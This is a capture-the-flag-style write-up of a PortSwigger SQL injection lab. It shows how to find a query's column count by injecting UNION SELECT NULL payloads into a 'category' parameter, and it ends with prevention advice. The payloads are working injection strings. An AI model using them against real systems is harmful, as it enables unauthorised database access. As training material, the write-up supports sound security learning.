SQL Injection: Determining Number of Columns (UNION)

Category: SQL Injection
Difficulty: Practitioner
Lab Link: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

---

Vulnerability

The application is vulnerable to SQL injection via the "category" parameter.
This allows the use of UNION-based SQL injection to manipulate the query.

---

Payload

' UNION SELECT NULL,NULL,NULL--

---

Exploitation Steps

1. Navigate to a product category.
2. Test column count using UNION:

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

3. The query succeeds when using 3 NULL values.

4. This indicates the original query returns 3 columns, solving the lab.

---

Why the Attack Works

For a UNION query to work:

- Number of columns must match
- Data types must be compatible

Using "NULL" avoids type mismatch issues.

When the correct number of columns is used, the query executes successfully.

---

Prevention

- Use parameterized queries
- Validate user input
- Avoid direct query concatenation
